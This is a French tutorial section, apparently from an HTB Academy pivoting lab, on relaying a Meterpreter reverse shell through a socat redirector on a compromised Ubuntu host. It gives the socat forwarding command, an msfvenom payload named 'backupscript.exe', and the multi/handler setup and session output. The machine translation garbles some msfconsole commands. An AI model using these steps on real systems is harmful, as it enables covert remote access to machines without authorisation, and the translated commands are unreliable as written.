Redirection Socat avec un shell inversé
======================================

[Socat](https://linux.die.net/man/1/socat) est un outil de relais bidirectionnel qui peut créer des sockets de canal entre `2` canaux réseau indépendants sans avoir besoin d'utiliser le tunnel SSH. Il agit comme un redirecteur qui peut écouter sur un hôte et un port et transférer ces données vers une autre adresse IP et un autre port. Nous pouvons démarrer l'écouteur de Metasploit en utilisant la même commande mentionnée dans la dernière section sur notre hôte d'attaque, et nous pouvons démarrer `socat` sur le serveur Ubuntu.

#### Démarrage de l'écouteur Socat

Démarrage de l'écouteur Socat

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080, fork TCP4:10.10.14.18:80

```

Socat écoutera sur localhost sur le port `8080` et transférera tout le trafic vers le port `80` sur notre hôte d'attaque (10.10.14.18). Une fois notre redirecteur configuré, nous pouvons créer une charge utile qui se reconnectera à notre redirecteur, qui s'exécute sur notre serveur Ubuntu. Nous allons également démarrer un écouteur sur notre hôte d'attaque car dès que socat recevra une connexion d'une cible, il redirigera tout le trafic vers l'écouteur de notre hôte d'attaque, où nous obtiendrions un shell.

#### Création de la charge utile Windows

Création de la charge utile Windows

```
dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 743 octets
Taille finale du fichier exe : 7168 octets
Enregistré sous : backupscript.exe

```

Gardez à l'esprit que nous devons transférer cette charge utile à l'hôte Windows. Nous pouvons utiliser certaines des mêmes techniques utilisées dans les sections précédentes pour le faire.

#### Démarrage de la console MSF

Démarrage de la console MSF

```
dsgsec@htb[/htb]$ sudo msfconsole

<SNIP>

```

#### Configuration et démarrage du multi/handler

Configurer et démarrer le multi/handler

```
msf6 > use exploit/multi/handler

[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
msf6 exploit(multi/handler) > définir la charge utile windows/x64/meterpreter/reverse_https
charge utile => windows/x64/meterpreter/reverse_https
exploit msf6 (multi/gestionnaire)> définir lhost 0.0.0.0
lhost => 0.0.0.0
exploit msf6 (multi/gestionnaire)> définir lport 80
port => 80
exploit msf6 (multi/gestionnaire)> exécuter

[*] Démarrage du gestionnaire inverse HTTPS sur https://0.0.0.0:80

```

Nous pouvons tester cela en exécutant à nouveau notre charge utile sur l'hôte Windows, et nous devrions voir une connexion réseau à partir du serveur Ubuntu cette fois.

#### Établir la session Meterpreter

Établir la session Meterpreter

```
[!] https://0.0.0.0:80 demande de traitement de 10.129.202.64 ; (UUID : 8hwcvdrp) Sans une base de données connectée, le suivi UUID de la charge utile ne fonctionnera pas !
[*] https://0.0.0.0:80 demande de traitement du 10.129.202.64 ; (UUID : 8hwcvdrp) Charge utile intermédiaire x64 (201 308 octets)...
[!] https://0.0.0.0:80 demande de traitement de 10.129.202.64 ; (UUID : 8hwcvdrp) Sans une base de données connectée, le suivi UUID de la charge utile ne fonctionnera pas !
[*] Meterpreter session 1 ouverte (10.10.14.18:80 -> 127.0.0.1 ) au 2022-03-07 11:08:10 -0500

meterpreter > getuid
Nom d'utilisateur du serveur : INLANEFREIGHT\victor

```